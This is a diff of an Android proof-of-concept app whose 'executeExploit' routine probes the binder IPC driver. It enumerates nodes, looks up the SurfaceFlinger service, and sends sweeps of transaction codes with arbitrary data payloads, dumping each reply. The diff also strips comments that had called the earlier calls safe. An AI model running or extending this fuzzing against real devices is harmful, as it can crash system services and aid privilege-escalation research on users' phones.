@@ -53,12 +53,13 @@ public class MainActivity extends AppCompatActivity {
         System.loadLibrary("pocjni");
     }
 
-    // 安全なネイティブメソッドのみ
     public static native int nativeOpenDevice(String path);
     public static native String nativeGetBinderVersion(int fd);
     public static native String nativeGetNodeDebugInfo(int fd, long ptr);
     public static native byte[] nativeBinderTransaction(int fd, int handle, int code, int flags, byte[] data);
     public static native byte[] nativeBinderPing(int fd);
+    public static native byte[] nativeBinderGetService(int fd, String serviceName);
+    public static native String nativeBinderTransactionWithDump(int fd, int handle, int code, int flags, byte[] data);
 
     private ServiceConnection tzConnection = new ServiceConnection() {
         @Override
@@ -168,7 +169,7 @@ public class MainActivity extends AppCompatActivity {
 
     private void executeExploit() {
         appendLog("========================================");
-        appendLog("========== BINDER/HAL EXPLORATION ==========");
+        appendLog("========== BINDER/SF EXPLORATION ==========");
 
         int hwbinderFd = nativeOpenDevice("/dev/hwbinder");
         int binderFd = nativeOpenDevice("/dev/binder");
@@ -178,63 +179,79 @@ public class MainActivity extends AppCompatActivity {
             return;
         }
 
-        // 優先的に /dev/binder を使用（システムサービス向け）
         int fd = (binderFd >= 0) ? binderFd : hwbinderFd;
         String devName = (binderFd >= 0) ? "/dev/binder" : "/dev/hwbinder";
         appendLog("[+] Using " + devName + " fd=" + fd);
 
-        // 1. BINDER_VERSION ioctl
-        appendLog("[*] Getting binder version via ioctl");
-        String version = nativeGetBinderVersion(fd);
-        appendLog("[VERSION] " + version);
+        appendLog("[*] Binder version: " + nativeGetBinderVersion(fd));
 
-        // 2. BINDER_GET_NODE_DEBUG_INFO (ノード列挙)
-        appendLog("[*] Enumerating binder nodes via BINDER_GET_NODE_DEBUG_INFO");
+        appendLog("[*] Enumerating binder nodes");
         long ptr = 0;
-        for (int i = 0; i < 10; i++) {
+        int nodeCount = 0;
+        for (int i = 0; i < 30; i++) {
             String info = nativeGetNodeDebugInfo(fd, ptr);
             appendLog("[NODE] " + info);
-            // 次のポインタを取得するため、情報をパース（簡易的に文字列から抽出）
-            // ここでは省略し、全てのノードを列挙（実際にはポインタを更新する必要あり）
-            // 今回はデモとして、最初の数ノードのみ表示
+            if (info.contains("ptr=0")) {
+                nodeCount++;
+                if (nodeCount > 5) break;
+            }
+            try { Thread.sleep(10); } catch (Exception e) {}
         }
 
-        // 3. PING トランザクション (安全)
-        appendLog("[*] Sending PING (code=0xFFFFFFFE, handle=0)");
+        appendLog("[*] PING test");
         byte[] pingReply = nativeBinderPing(fd);
         if (pingReply != null) {
-            appendLog("[PING] Reply len=" + pingReply.length);
+            appendLog("[PING] len=" + pingReply.length);
+            dumpHex(pingReply, "PING");
             dumpToFile(pingReply, "binder_ping_reply.bin");
-        } else {
-            appendLog("[PING] No reply or error");
         }
 
-        // 4. ハンドル0 に対する様々なコード（安全なもの）
-        int[] codes = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0x10, 0x20, 0x40, 0x80, 0x100, 0x200, 0x400, 0x800};
+        String[] sfNames = {
+            "android.ui.ISurfaceComposer",
+            "android.gui.ISurfaceComposer",
+            "SurfaceFlinger",
+            "android.ui.ISurfaceFlinger",
+            "android.gui.SurfaceFlinger",
+            "com.android.server.display.DisplayManagerService"
+        };
+
+        for (String name : sfNames) {
+            appendLog("[GETSVC] Trying: " + name);
+            byte[] reply = nativeBinderGetService(fd, name);
+            if (reply != null && reply.length > 0) {
+                appendLog("[GETSVC] " + name + " len=" + reply.length);
+                dumpHex(reply, "GETSVC_" + name.replace(".", "_"));
+                dumpToFile(reply, "getsvc_" + name.replace(".", "_") + ".bin");
+                if (reply.length >= 4) {
+                    int handle = ((reply[0] & 0xFF) |
+                                  ((reply[1] & 0xFF) << 8) |
+                                  ((reply[2] & 0xFF) << 16) |
+                                  ((reply[3] & 0xFF) << 24));
+                    appendLog("[GETSVC] -> handle=" + handle + " (0x" + Integer.toHexString(handle) + ")");
+                    if (handle != 0) {
+                        testSurfaceFlinger(fd, handle);
+                    }
+                }
+            } else {
+                appendLog("[GETSVC] " + name + " -> no reply");
+            }
+            try { Thread.sleep(50); } catch (Exception e) {}
+        }
+
+        appendLog("[*] Testing handle 0 with various codes");
+        int[] codes = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0x10, 0x20, 0x40, 0x80, 0x100, 0x200, 0x400, 0x800, 0x1000, 0x2000};
         for (int code : codes) {
             if (stopRequested.get()) break;
-            appendLog("[TX] handle=0 code=0x" + Integer.toHexString(code));
-            byte[] reply = nativeBinderTransaction(fd, 0, code, 0, null);
-            if (reply != null) {
-                appendLog("[TX] reply len=" + reply.length);
-                dumpToFile(reply, "tx_handle0_code" + code + ".bin");
-            } else {
-                appendLog("[TX] no reply");
-            }
+            String result = nativeBinderTransactionWithDump(fd, 0, code, 0, null);
+            appendLog("[TX] handle=0 code=0x" + Integer.toHexString(code) + " -> " + result);
+            try { Thread.sleep(5); } catch (Exception e) {}
         }
 
-        // 5. ハンドル1 に対しても同様（既存のログで応答があった）
-        int[] handles = {1, 2, 3, 4, 5};
-        for (int h : handles) {
-            if (stopRequested.get()) break;
-            appendLog("[TX] handle=" + h + " code=0");
-            byte[] reply = nativeBinderTransaction(fd, h, 0, 0, null);
-            if (reply != null) {
-                appendLog("[TX] handle=" + h + " reply len=" + reply.length);
-                dumpToFile(reply, "tx_handle" + h + "_code0.bin");
-            } else {
-                appendLog("[TX] handle=" + h + " no reply");
-            }
+        appendLog("[*] Testing handles 1-5");
+        for (int h = 1; h <= 5; h++) {
+            String result = nativeBinderTransactionWithDump(fd, h, 0, 0, null);
+            appendLog("[TX] handle=" + h + " code=0 -> " + result);
+            try { Thread.sleep(5); } catch (Exception e) {}
         }
 
         if (binderFd >= 0) try { ParcelFileDescriptor.adoptFd(binderFd).close(); } catch (Exception e) {}
@@ -249,6 +266,61 @@ public class MainActivity extends AppCompatActivity {
         finishTest();
     }
 
+    private void testSurfaceFlinger(int fd, int handle) {
+        appendLog("[SF] Testing SurfaceFlinger handle=" + handle);
+
+        int[] sfCodes = {
+            1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
+            11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
+            21, 22, 23, 24,
+            0x100, 0x101, 0x102, 0x103, 0x104,
+            0x105, 0x106, 0x107, 0x108, 0x109,
+            0x10A, 0x200, 0x201, 0x202, 0x203,
+            0x204, 0x205, 0x206, 0x207, 0x208,
+            0x209, 0x20A
+        };
+
+        for (int code : sfCodes) {
+            if (stopRequested.get()) break;
+            String result = nativeBinderTransactionWithDump(fd, handle, code, 0, null);
+            appendLog("[SF] code=0x" + Integer.toHexString(code) + " -> " + result);
+            try { Thread.sleep(5); } catch (Exception e) {}
+        }
+
+        byte[] dummyData = new byte[64];
+        for (int i = 0; i < dummyData.length; i++) dummyData[i] = (byte)(i + 1);
+        int[] dataCodes = {1, 3, 4, 5, 6, 7, 8, 9, 10, 13, 16, 17, 18, 19, 20, 21};
+        for (int code : dataCodes) {
+            String result = nativeBinderTransactionWithDump(fd, handle, code, 0, dummyData);
+            appendLog("[SF-DATA] code=0x" + Integer.toHexString(code) + " -> " + result);
+            try { Thread.sleep(5); } catch (Exception e) {}
+        }
+
+        byte[] layerData = new byte[128];
+        for (int i = 0; i < 128; i++) layerData[i] = (byte)(i);
+        for (int code : new int[]{1, 2, 3, 4, 5, 6, 7, 8}) {
+            String result = nativeBinderTransactionWithDump(fd, handle, code, 1, layerData);
+            appendLog("[SF-ONEWAY] code=0x" + Integer.toHexString(code) + " -> " + result);
+            try { Thread.sleep(5); } catch (Exception e) {}
+        }
+    }
+
+    private void dumpHex(byte[] data, String label) {
+        if (data == null || data.length == 0) {
+            appendLog("[HEX:" + label + "] (empty)");
+            return;
+        }
+        StringBuilder sb = new StringBuilder();
+        sb.append("[HEX:" + label + "] ");
+        int len = Math.min(data.length, 128);
+        for (int i = 0; i < len; i++) {
+            sb.append(String.format("%02x ", data[i]));
+            if ((i + 1) % 16 == 0 && i < len - 1) sb.append("\n[HEX:" + label + "] ");
+        }
+        if (len < data.length) sb.append("... (" + data.length + " bytes total)");
+        appendLog(sb.toString());
+    }
+
     private void dumpToFile(byte[] data, String filename) {
         File dir = getDumpDir();
         if (dir == null || data == null) return;
@@ -257,7 +329,7 @@ public class MainActivity extends AppCompatActivity {
             fos.write(data);
             appendLog("[DUMP] Saved " + data.length + " bytes to " + file.getAbsolutePath());
         } catch (Exception e) {
-            appendLog("[DUMP] Failed to save " + filename + ": " + e.getMessage());
+            appendLog("[DUMP] Failed: " + e.getMessage());
         }
     }
 
@@ -289,7 +361,7 @@ public class MainActivity extends AppCompatActivity {
             File dir = getDumpDir();
             File file = new File(dir, "binder_explore_log.txt");
             try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
-                pw.println("=== Binder/HAL Exploration Log ===");
+                pw.println("=== Binder/SF Exploration Log ===");
                 pw.println("Timestamp: " + new Date().toString());
                 pw.println("===================================");
                 pw.print(logBuilder.toString());
